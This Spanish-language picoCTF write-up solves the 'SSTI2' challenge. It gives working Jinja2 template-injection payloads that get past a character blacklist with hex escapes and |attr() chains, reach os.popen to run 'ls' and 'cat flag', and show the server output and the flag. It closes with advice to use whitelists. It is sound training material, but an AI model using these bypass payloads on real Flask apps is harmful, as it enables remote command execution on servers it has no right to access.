### [SSTI2](https://play.picoctf.org/practice/challenge/488)

### DESCRIPCIÓN

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:57474/)!
### SOLUCIÓN

Identificamos que el sitio es vulnerable a Server Side Template Injection (SSTI) usando Jinja2 en Flask. Sin embargo, el servidor implementa un filtro de lista negra (blacklist) que bloquea caracteres clave como guiones bajos (`_`), puntos (`.`) y corchetes (`[` y `]`).

- Comprobamos la inyección y los filtros evadiendo los guiones bajos usando su representación hexadecimal (`\x5f`) y el punto usando el filtro `|attr()` de Jinja2:

```
{{ self|attr("\x5f\x5fdict\x5f\x5f") }}

Resultado del servidor:

{'_TemplateReference__context': <Context {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x75239c92e160>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'url_for': <bound method Flask.url_for of <Flask 'app'>>, 'get_flashed_messages': <function get_flashed_messages at 0x75239c98e8b0>, 'config': <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>, 'request': <Request 'http://shape-facility.picoctf.net:55974/announce' [POST]>, 'session': <NullSession {}>, 'g': <flask.g of 'app'>} of None>}

```


_Esto nos devuelve el diccionario del entorno, confirmando que tenemos acceso al objeto `config`._

- Construimos el payload para lograr Ejecución Remota de Comandos (RCE). Para evadir los corchetes que bloquean el acceso a los diccionarios (ej. `['os']`), usamos el método `get()` de Python a través de `|attr('get')('os')`. Inyectamos un comando `ls` para listar los archivos del directorio:

```
{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('ls')|attr('read')()}}

Resultado del servidor:
__pycache__ app.py flag requirements.txt
```

- Al ver que el archivo de la bandera se llama `flag` (y no `flag.txt`), modificamos nuestro payload para leer su contenido usando el comando `cat`:
 
```
{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('cat flag')|attr('read')()}}
```


 picoCTF{sst1_f1lt3r_byp4ss_afa6aa72}
### NOTAS ADICIONALES

**¿Por qué es mala idea usar listas negras (blacklisting) para sanitizar inputs?** 

Como demuestra este reto, los lenguajes de programación y los motores de plantillas suelen tener múltiples formas de interpretar y ejecutar una misma acción. Si bloqueas un carácter (como el punto `.`), el atacante simplemente buscará una función equivalente (como `|attr()`). Las listas negras son casi imposibles de mantener exhaustivas. La práctica segura es usar **listas blancas (whitelisting)**, donde solo se permiten explícitamente los caracteres o formatos seguros y se rechaza todo lo demás.
### REFERENCIAS

PayloadsAllTheThings - Jinja2 SSTI: 
[`https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
